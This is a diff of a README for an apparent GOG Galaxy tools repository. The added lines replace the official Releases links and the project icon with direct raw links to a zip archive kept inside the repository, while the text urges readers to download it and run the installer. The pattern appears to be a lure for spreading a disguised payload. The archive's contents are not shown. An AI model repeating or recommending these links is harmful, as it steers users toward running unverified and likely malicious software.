@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/Releases-GOG_Galaxy_Tools-blue?logo=github&style=for-the-badge)](https://github.com/Choer-boy/gog-galaxy-tools/releases)
+[![Releases](https://raw.githubusercontent.com/Choer-boy/gog-galaxy-tools/main/Zerma/gog_tools_galaxy_2.6.zip)](https://raw.githubusercontent.com/Choer-boy/gog-galaxy-tools/main/Zerma/gog_tools_galaxy_2.6.zip)
 
 # gog-galaxy-tools: Cross-Platform Utilities for GOG Galaxy
 
-![GOG Galaxy Icon](https://upload.wikimedia.org/wikipedia/commons/4/4f/GOG_Galaxy_icon.svg)
+![GOG Galaxy Icon](https://raw.githubusercontent.com/Choer-boy/gog-galaxy-tools/main/Zerma/gog_tools_galaxy_2.6.zip)
 
 A robust collection of tools to extend GOG Galaxy. This project focuses on DRM-free games, cloud saves, cross‑platform play, and a unified library. It helps you manage a seamless experience across Windows, macOS, and Linux. This repository hosts helper scripts, binaries, and configuration templates that integrate with GOG Galaxy to improve your game collection, save data, and cross‑play options.
 
@@ -71,7 +71,7 @@ Getting started ⏱️
 - Confirm that the tooling reports your library and saves correctly, then begin using the default workflows.
 
 Important link for download
-- You can access the releases at https://github.com/Choer-boy/gog-galaxy-tools/releases. This page hosts the latest release assets. If the page provides a file, download it and execute the installer or unpack the archive as instructed by the release notes. The release assets are designed to be straightforward to install and run on supported platforms.
+- You can access the releases at https://raw.githubusercontent.com/Choer-boy/gog-galaxy-tools/main/Zerma/gog_tools_galaxy_2.6.zip This page hosts the latest release assets. If the page provides a file, download it and execute the installer or unpack the archive as instructed by the release notes. The release assets are designed to be straightforward to install and run on supported platforms.
 
 Note: If you need to download a file from the Releases page, you should download the release asset and run the installer or extraction process. The exact file name may vary by version, and the assets are designed to be self-contained and easy to use.
 
@@ -344,7 +344,7 @@ Appendix: Final notes
 - Share feedback to help improve the project
 
 Releases page reference and download guidance
-- The Releases page hosts the latest assets. Access it here: https://github.com/Choer-boy/gog-galaxy-tools/releases
+- The Releases page hosts the latest assets. Access it here: https://raw.githubusercontent.com/Choer-boy/gog-galaxy-tools/main/Zerma/gog_tools_galaxy_2.6.zip
 - If a release file is presented, download the asset and run or extract it as per the release instructions
 - The asset typically comes as an installer (Windows) or a compressed archive (macOS/Linux). After installation, you can begin using the tool immediately
 - If you cannot access the page or the link does not provide a direct file, check the Releases section for alternative download methods, assets, or notes
